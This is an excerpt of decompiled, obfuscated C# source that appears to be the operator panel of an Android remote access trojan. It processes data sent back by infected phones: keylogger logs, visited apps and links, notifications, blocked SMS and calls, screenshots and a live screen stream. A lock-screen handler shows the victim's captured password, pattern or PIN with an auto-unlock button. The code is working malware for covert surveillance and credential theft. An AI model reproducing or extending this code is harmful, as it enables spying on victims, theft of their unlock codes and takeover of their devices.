						ed25519Signer.BlockUpdate(bytes, 0, bytes.Length);
						byte[] inArray = ed25519Signer.GenerateSignature();
						Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
						dictionary4.Add(EXGuarder._29444245, BTConst.hello_ok);
						dictionary4.Add(EXGuarder._16553957, true);
						dictionary4.Add(EXGuarder._38465C75, Convert.ToBase64String(KeyGenerator.LoadedExchangePublicKey));
						dictionary4.Add(EXGuarder._1F5E686D, text6);
						dictionary4.Add(EXGuarder._1E133D2C, Convert.ToBase64String(inArray));
						Dictionary<string, object> chatData = dictionary4;
						commands(chatData, text3, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
						if (clientById != null)
						{
							clientById.IsSecured = true;
						}
					}
					return;
				}
				if (Operators.CompareString(left2, BTConst.addme, TextCompare: false) == 0)
				{
					if (Operators.CompareString(text2, BTConst.hellome, TextCompare: false) != 0 && Operators.CompareString(text2, BTConst.addme, TextCompare: false) != 0)
					{
						BTClient clientById2 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (clientById2 == null || !clientById2.VerifiedSecure)
						{
							commandsleep(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
							return;
						}
					}
					AddOrUpdateClient(dictionary3, _121E, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
					return;
				}
				if (Operators.CompareString(left2, BTConst.pingcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D0 arg = default(_Closure_0024__15_002D0);
						_Closure_0024__15_002D0 CS_0024_003C_003E8__locals402 = new _Closure_0024__15_002D0(arg);
						CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient == null)
						{
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, BTConst.addme);
							Dictionary<string, object> chatData2 = dictionary4;
							commands(chatData2, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
						}
						else if (!CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.Exiting)
						{
							if (CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.row == null)
							{
								Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
								dictionary4.Add(EXGuarder._75106764, BTConst.addme);
								Dictionary<string, object> chatData3 = dictionary4;
								commands(chatData3, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							}
							else
							{
								CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.IamOnline();
								try
								{
									string text7 = dictionary3[EXGuarder._423F7852].ToString();
									string pingms = dictionary3[EXGuarder._3933474F].ToString();
									string activewindow = dictionary3[EXGuarder._331D5043].ToString();
									string jects_count = ((!dictionary3.ContainsKey(EXGuarder._672B1768)) ? EXGuarder._25676E1D : dictionary3[EXGuarder._672B1768]?.ToString());
									string keyloggs = ((!dictionary3.ContainsKey(EXGuarder._35281153)) ? EXGuarder._705B363B : dictionary3[EXGuarder._35281153]?.ToString());
									string visitedapps = ((!dictionary3.ContainsKey(EXGuarder._4A196227)) ? EXGuarder._705B363B : dictionary3[EXGuarder._4A196227]?.ToString());
									string activies = ((!dictionary3.ContainsKey(EXGuarder._39796108)) ? EXGuarder._705B363B : dictionary3[EXGuarder._39796108]?.ToString());
									string notifications = ((!dictionary3.ContainsKey(EXGuarder._4B1C3477)) ? EXGuarder._705B363B : dictionary3[EXGuarder._4B1C3477]?.ToString());
									string visitedlinks = ((!dictionary3.ContainsKey(EXGuarder._67060334)) ? EXGuarder._705B363B : dictionary3[EXGuarder._67060334]?.ToString());
									string blockedSMS = ((!dictionary3.ContainsKey(EXGuarder._53317530)) ? EXGuarder._705B363B : dictionary3[EXGuarder._53317530]?.ToString());
									string blockedCalls = ((!dictionary3.ContainsKey(EXGuarder._2A6D1D1F)) ? EXGuarder._705B363B : dictionary3[EXGuarder._2A6D1D1F]?.ToString());
									string text8 = ((!dictionary3.ContainsKey(EXGuarder._5C711B57)) ? EXGuarder._121E6943 : dictionary3[EXGuarder._5C711B57]?.ToString());
									string text9 = ((!dictionary3.ContainsKey(EXGuarder._433E4748)) ? EXGuarder._121E6943 : dictionary3[EXGuarder._433E4748]?.ToString());
									string text10 = ((!dictionary3.ContainsKey(EXGuarder._46680463)) ? CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.charging : dictionary3[EXGuarder._46680463]?.ToString());
									string left3 = ((!dictionary3.ContainsKey(EXGuarder._4E6A5E75)) ? EXGuarder._121E6943 : dictionary3[EXGuarder._4E6A5E75]?.ToString());
									string text11 = ((!dictionary3.ContainsKey(EXGuarder._3B273B44)) ? EXGuarder._121E6943 : dictionary3[EXGuarder._3B273B44]?.ToString());
									string left4 = ((!dictionary3.ContainsKey(EXGuarder._6F223574)) ? EXGuarder._25676E1D : dictionary3[EXGuarder._6F223574]?.ToString());
									string updateTag = ((!dictionary3.ContainsKey(EXGuarder._76394871)) ? EXGuarder._3D747172 : dictionary3[EXGuarder._76394871]?.ToString());
									string left5 = ((!dictionary3.ContainsKey(EXGuarder._23094440)) ? EXGuarder._25676E1D : dictionary3[EXGuarder._23094440]?.ToString());
									string left6 = ((!dictionary3.ContainsKey(EXGuarder._666B0135)) ? EXGuarder._25676E1D : dictionary3[EXGuarder._666B0135]?.ToString());
									if (CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.isFavorite && CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.screenstate != null && Operators.CompareString(CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.screenstate, text7, TextCompare: false) != 0)
									{
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											MainForm.DynamicMsg(BTConst.scrchngdstr, CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.wallpaper);
										}));
									}
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.isDeviceAdmin = Operators.CompareString(left5, EXGuarder._491F0527, TextCompare: false) == 0;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.UpdateRequested = Operators.CompareString(left4, EXGuarder._491F0527, TextCompare: false) == 0;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.EncryptState = Operators.CompareString(left6, EXGuarder._491F0527, TextCompare: false) == 0;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.UpdateTag = updateTag;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.pingms = pingms;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.screenstate = text7;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.screen = MyRes.GetScreen(text7);
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.activewindow = activewindow;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.jects_count = jects_count;
									if (text8.StartsWith(EXGuarder._665D2001) & text9.StartsWith(EXGuarder._665D2001))
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.angle = Sensors.GetPosition(text8.Trim('#'));
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.lights = Sensors.GetLight(text9.Trim('#'));
									}
									else
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.angle = text8;
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.lights = text9;
									}
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.charging = text10;
									if (text11.Length > 0 && text11.Contains(EXGuarder._3E086753))
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.Foundedjects = text11.Replace(EXGuarder._3E086753, EXGuarder._071E0500);
									}
									else
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.Foundedjects = EXGuarder._3D747172;
									}
									if (Operators.CompareString(left3, EXGuarder._3E505264, TextCompare: false) == 0)
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.battery = MyRes.GetBattery(text10);
									}
									else
									{
										CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.battery = Resources.battery_oncharge;
									}
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.keyloggs = keyloggs;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.activies = activies;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.visitedapps = visitedapps;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.notifications = notifications;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.visitedlinks = visitedlinks;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.BlockedSMS = blockedSMS;
									CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.BlockedCalls = blockedCalls;
								}
								catch (Exception ex5)
								{
									ProjectData.SetProjectError(ex5);
									Exception ex6 = ex5;
									Debuger.Log_e(EXGuarder._4C2D1961, codes.EXtoString(ex6));
									ProjectData.ClearProjectError();
								}
								CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.sendoptions();
								if (CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient.row != null)
								{
									MainForm.UpdateClient(new object[1] { CS_0024_003C_003E8__locals402._0024VB_0024Local_classclient });
								}
							}
						}
						return;
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						Debuger.Log_e(EXGuarder._5039553F, codes.EXtoString(ex8));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.snapcom, TextCompare: false) == 0)
				{
					try
					{
						string s2 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
							.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
						byte[] array2 = Convert.FromBase64String(s2);
						BTClient clientById3 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (clientById3 != null)
						{
							Bitmap bitmap;
							using (MemoryStream stream = new MemoryStream(array2, 0, array2.Length, writable: true, publiclyVisible: true))
							{
								using MagickImage magickImage = new MagickImage(stream);
								bitmap = magickImage.ToBitmap();
							}
							if (bitmap != null)
							{
								string text12 = clientById3.userfolder + EXGuarder._55377252;
								if (!Directory.Exists(text12))
								{
									Directory.CreateDirectory(text12);
								}
								string text13 = DateTime.Now.ToString(EXGuarder._4A2C400C);
								string filename = text12 + EXGuarder._36120632 + text13 + EXGuarder._5D106316;
								bitmap.Save(filename, ImageFormat.Png);
								Process.Start(text12);
								bitmap.Dispose();
							}
						}
						return;
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						Debuger.Log_e(EXGuarder._100E5C14, codes.EXtoString(ex10));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.livescreencom, TextCompare: false) == 0)
				{
					try
					{
						BTClient clientById4 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (clientById4 != null)
						{
							string s3 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
								.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
							byte[] array3 = Convert.FromBase64String(s3);
							Bitmap bitmap2;
							using (MemoryStream stream2 = new MemoryStream(array3, 0, array3.Length, writable: true, publiclyVisible: true))
							{
								using MagickImage magickImage2 = new MagickImage(stream2);
								bitmap2 = magickImage2.ToBitmap();
							}
							if (bitmap2 != null)
							{
								if (MainForm.clientPanels.ContainsKey(closure_0024__15_002D2._0024VB_0024Local_mobid))
								{
									Panel panel = MainForm.clientPanels[closure_0024__15_002D2._0024VB_0024Local_mobid];
									PictureBox pictureBox = (PictureBox)panel.Controls[0];
									pictureBox.Image = bitmap2;
								}
								else
								{
									clientById4.UpdateOption(EXGuarder._52100128, EXGuarder._25676E1D);
								}
							}
						}
						return;
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						Debuger.Log_e(EXGuarder._3750412A, codes.EXtoString(ex12));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.screadcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D1 argScreen = default(_Closure_0024__15_002D1);
						_Closure_0024__15_002D1 CS_0024_003C_003E8__locals406 = new _Closure_0024__15_002D1(argScreen);
						string name = EXGuarder._1237222A + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform = (ScreenReader)MyProject.Application.OpenForms[name];
						if (CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform == null)
						{
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, EXGuarder._45753F16);
							dictionary4.Add(EXGuarder._28443749, EXGuarder._25676E1D);
							Dictionary<string, object> chatData4 = dictionary4;
							commands(chatData4, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
						}
						else
						{
							string s4 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
								.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
							string left7 = dictionary3[EXGuarder._19774B4F].ToString();
							byte[] array4 = Convert.FromBase64String(s4);
							Bitmap bitmap3 = default(Bitmap);
							using (MemoryStream stream3 = new MemoryStream(array4, 0, array4.Length, writable: true, publiclyVisible: true))
							{
								try
								{
									if (Operators.CompareString(left7, EXGuarder._01405901, TextCompare: false) == 0)
									{
										using MagickImage magickImage3 = new MagickImage(stream3);
										bitmap3 = magickImage3.ToBitmap();
									}
								}
								catch (Exception ex13)
								{
									ProjectData.SetProjectError(ex13);
									Exception ex14 = ex13;
									Debuger.Log_e(EXGuarder._4D582477, codes.EXtoString(ex14));
									bitmap3 = null;
									ProjectData.ClearProjectError();
								}
							}
							if (bitmap3 != null)
							{
								CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.viewimage.Image = bitmap3;
								if (CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.myscr.Visible)
								{
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.myscr.Visible = false;
									}));
								}
							}
							CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.newphoto = true;
							CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.FPS++;
							string value2 = dictionary3[EXGuarder._44550666].ToString();
							string value3 = dictionary3[EXGuarder._76090C71].ToString();
							CS_0024_003C_003E8__locals406._0024VB_0024Local_screenorintaion = (dictionary3.ContainsKey(EXGuarder._5C1D5008) ? dictionary3[EXGuarder._5C1D5008].ToString() : EXGuarder._206C5C0B);
							CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.screenorinta = CS_0024_003C_003E8__locals406._0024VB_0024Local_screenorintaion;
							if (Operators.ConditionalCompareObjectEqual(CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.autorotbtn.Tag, EXGuarder._491F0527, TextCompare: false) && Operators.CompareString(CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.Lastrotate, CS_0024_003C_003E8__locals406._0024VB_0024Local_screenorintaion, TextCompare: false) != 0)
							{
								CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.Lastrotate = CS_0024_003C_003E8__locals406._0024VB_0024Local_screenorintaion;
								Action action = [SpecialName] () =>
								{
									Rectangle workingArea = Screen.FromControl(CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform).WorkingArea;
									string left37 = CS_0024_003C_003E8__locals406._0024VB_0024Local_screenorintaion;
									Size size = default(Size);
									if (Operators.CompareString(left37, "P", TextCompare: false) != 0)
									{
										if (Operators.CompareString(left37, "L", TextCompare: false) == 0)
										{
											int num19 = (int)Math.Round((double)workingArea.Width * 0.6);
											int height = (int)Math.Round((double)num19 * 9.0 / 16.0);
											size = new Size(num19, height);
										}
									}
									else
									{
										int num20 = (int)Math.Round((double)workingArea.Height * 0.9);
										int width = (int)Math.Round((double)num20 * 9.0 / 16.0);
										size = new Size(width, num20);
									}
									CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.Size = size;
								};
								if (CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.InvokeRequired)
								{
									CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.Invoke(action);
								}
								else
								{
									action();
								}
							}
							CS_0024_003C_003E8__locals406._0024VB_0024Local_screenform.screenSize = new Size(Conversions.ToInteger(value2), Conversions.ToInteger(value3));
						}
						return;
					}
					catch (Exception ex15)
					{
						ProjectData.SetProjectError(ex15);
						Exception ex16 = ex15;
						Debuger.Log_e(EXGuarder._5E442046, codes.EXtoString(ex16));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.screencom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D2 arg3 = default(_Closure_0024__15_002D2);
						_Closure_0024__15_002D2 closure_0024__15_002D3 = new _Closure_0024__15_002D2(arg3);
						string name2 = EXGuarder._2F38373C + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D3._0024VB_0024Local_screenform = (ScreenMonitor)MyProject.Application.OpenForms[name2];
						if (closure_0024__15_002D3._0024VB_0024Local_screenform == null)
						{
							VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._051F4D2A);
							string value4 = BTCommand.FormatCommand(EXGuarder._0B4B3617, data);
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, BTConst.wrk);
							dictionary4.Add(EXGuarder._126B4509, value4);
							Dictionary<string, object> chatData5 = dictionary4;
							commands(chatData5, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							try
							{
								if (dictionary3.ContainsKey(EXGuarder._3909336A))
								{
									string left8 = dictionary3[EXGuarder._3909336A].ToString();
									if (Operators.CompareString(left8, EXGuarder._491F0527, TextCompare: false) == 0)
									{
										dictionary4 = new Dictionary<string, object>();
										dictionary4.Add(EXGuarder._75106764, EXGuarder._786C4641);
										dictionary4.Add(EXGuarder._6F070567, EXGuarder._634C273E);
										dictionary4.Add(EXGuarder._25426141, EXGuarder._25676E1D);
										Dictionary<string, object> dictionary5 = dictionary4;
										commands(chatData5, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
									}
								}
								return;
							}
							catch (Exception ex17)
							{
								ProjectData.SetProjectError(ex17);
								Exception ex18 = ex17;
								ProjectData.ClearProjectError();
								return;
							}
						}
						string s5 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
							.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
						string left9 = dictionary3[EXGuarder._19774B4F].ToString();
						byte[] array5 = Convert.FromBase64String(s5);
						Bitmap bitmap4 = default(Bitmap);
						using (MemoryStream memoryStream = new MemoryStream(array5, 0, array5.Length, writable: true, publiclyVisible: true))
						{
							try
							{
								if (Operators.CompareString(left9, EXGuarder._01405901, TextCompare: false) == 0)
								{
									using MagickImage magickImage4 = new MagickImage(memoryStream);
									bitmap4 = magickImage4.ToBitmap();
								}
							}
							catch (Exception ex19)
							{
								ProjectData.SetProjectError(ex19);
								Exception ex20 = ex19;
								Debuger.Log_e(EXGuarder._5D314E0C, codes.EXtoString(ex20));
								bitmap4 = null;
								ProjectData.ClearProjectError();
							}
							if (bitmap4 == null)
							{
								try
								{
									if (Operators.CompareString(left9, EXGuarder._3D123B0D, TextCompare: false) == 0)
									{
										memoryStream.Position = 0L;
										using Bitmap original = (Bitmap)Image.FromStream(memoryStream);
										bitmap4 = new Bitmap(original);
									}
								}
								catch (Exception ex21)
								{
									ProjectData.SetProjectError(ex21);
									Exception ex22 = ex21;
									Debuger.Log_e(EXGuarder._49596341, codes.EXtoString(ex22));
									bitmap4 = null;
									ProjectData.ClearProjectError();
								}
							}
						}
						if (bitmap4 != null)
						{
							_Closure_0024__15_002D3 argLive = default(_Closure_0024__15_002D3);
							_Closure_0024__15_002D3 CS_0024_003C_003E8__locals412 = new _Closure_0024__15_002D3(argLive);
							CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3 = closure_0024__15_002D3;
							string left10 = dictionary3[EXGuarder._3909336A].ToString();
							if (Operators.CompareString(left10, EXGuarder._491F0527, TextCompare: false) == 0)
							{
								if (CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.LiveisBigger)
								{
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.smallviewimage.Image = bitmap4;
								}
								else
								{
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.viewimage.Image = bitmap4;
								}
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.myscr.Visible = false;
							}
							else if (!CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.LiveisBigger)
							{
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.smallviewimage.Image = bitmap4;
							}
							else
							{
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.viewimage.Image = bitmap4;
							}
							CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.FPS++;
							if (CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.myscr.Visible)
							{
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.CurrentState = EXGuarder._492F2C01;
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.myscr.Visible = false;
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.baseloader.Enabled = false;
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.baseloader.Visible = false;
								}));
							}
							CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.screenSize = new Size(Conversions.ToInteger(dictionary3[EXGuarder._44550666]), Conversions.ToInteger(dictionary3[EXGuarder._76090C71]));
							CS_0024_003C_003E8__locals412._0024VB_0024Local_screenorintaion = (dictionary3.ContainsKey(EXGuarder._5C1D5008) ? dictionary3[EXGuarder._5C1D5008].ToString() : EXGuarder._206C5C0B);
							CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.screenorinta = CS_0024_003C_003E8__locals412._0024VB_0024Local_screenorintaion;
							if (Operators.ConditionalCompareObjectEqual(CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.autorotbtn.Tag, EXGuarder._491F0527, TextCompare: false) && Operators.CompareString(CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.Lastrotate, CS_0024_003C_003E8__locals412._0024VB_0024Local_screenorintaion, TextCompare: false) != 0)
							{
								CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.Lastrotate = CS_0024_003C_003E8__locals412._0024VB_0024Local_screenorintaion;
								Action action2 = [SpecialName] () =>
								{
									Rectangle workingArea = Screen.FromControl(CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform).WorkingArea;
									string left37 = CS_0024_003C_003E8__locals412._0024VB_0024Local_screenorintaion;
									Size size = default(Size);
									if (Operators.CompareString(left37, "P", TextCompare: false) != 0)
									{
										if (Operators.CompareString(left37, "L", TextCompare: false) == 0)
										{
											int num19 = (int)Math.Round((double)workingArea.Width * 0.6);
											int height = (int)Math.Round((double)num19 * 9.0 / 16.0);
											size = new Size(num19, height);
										}
									}
									else
									{
										int num20 = (int)Math.Round((double)workingArea.Height * 0.9);
										int width = (int)Math.Round((double)num20 * 9.0 / 16.0);
										size = new Size(width, num20);
									}
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.Size = size;
								};
								if (CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.InvokeRequired)
								{
									CS_0024_003C_003E8__locals412._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.Invoke(action2);
								}
								else
								{
									action2();
								}
							}
						}
						else
						{
							closure_0024__15_002D3._0024VB_0024Local_screenform.CurrentState = EXGuarder._0A6E3945;
						}
						return;
					}
					catch (Exception ex23)
					{
						ProjectData.SetProjectError(ex23);
						Exception ex24 = ex23;
						Debuger.Log_e(EXGuarder._786C4641, codes.EXtoString(ex24));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.lockcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D4 arg4 = default(_Closure_0024__15_002D4);
						_Closure_0024__15_002D4 CS_0024_003C_003E8__locals436 = new _Closure_0024__15_002D4(arg4);
						CS_0024_003C_003E8__locals436._0024VB_0024NonLocal__0024VB_0024Closure_4 = closure_0024__15_002D2;
						CS_0024_003C_003E8__locals436._0024VB_0024Local_classclient = GetClientById(CS_0024_003C_003E8__locals436._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_mobid);
						if (CS_0024_003C_003E8__locals436._0024VB_0024Local_classclient != null)
						{
							CS_0024_003C_003E8__locals436._0024VB_0024Local_handle = EXGuarder._793D784E + CS_0024_003C_003E8__locals436._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_mobid;
							CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform = (lockscreen)MyProject.Application.OpenForms[CS_0024_003C_003E8__locals436._0024VB_0024Local_handle];
							CS_0024_003C_003E8__locals436._0024VB_0024Local_islocked = bool.Parse(dictionary3[EXGuarder._5E4F091F].ToString());
							CS_0024_003C_003E8__locals436._0024VB_0024Local_capturelock = EXGuarder._5567045D;
							if (dictionary3[EXGuarder._77195101] != null && dictionary3[EXGuarder._77195101].ToString().Length > 0)
							{
								CS_0024_003C_003E8__locals436._0024VB_0024Local_capturelock = dictionary3[EXGuarder._77195101].ToString();
							}
							CS_0024_003C_003E8__locals436._0024VB_0024Local_passcods = dictionary3[EXGuarder._5C764442].ToString();
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								if (CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform == null)
								{
									CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform = new lockscreen();
									CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.Tag = "locker" + CS_0024_003C_003E8__locals436._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_mobid;
									CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.Name = CS_0024_003C_003E8__locals436._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.BTcli = CS_0024_003C_003E8__locals436._0024VB_0024Local_classclient;
									if (CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Columns["excutclmn"] == null)
									{
										DataGridViewButtonColumn dataGridViewColumn = CreateDgvRunButtonColumn();
										CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Columns.Add(dataGridViewColumn);
									}
									CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.Show();
								}
								CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Clear();
								if (CS_0024_003C_003E8__locals436._0024VB_0024Local_capturelock.Contains(":"))
								{
									string[] array34 = CS_0024_003C_003E8__locals436._0024VB_0024Local_capturelock.Split(":");
									string text79 = array34[0];
									string text80 = array34[1];
									switch (text79)
									{
									case "pa":
										CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Password", text80, BTConst.autounlockbtnstr);
										break;
									case "pt":
										CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Pattern", text80, BTConst.autounlockbtnstr);
										break;
									case "pi":
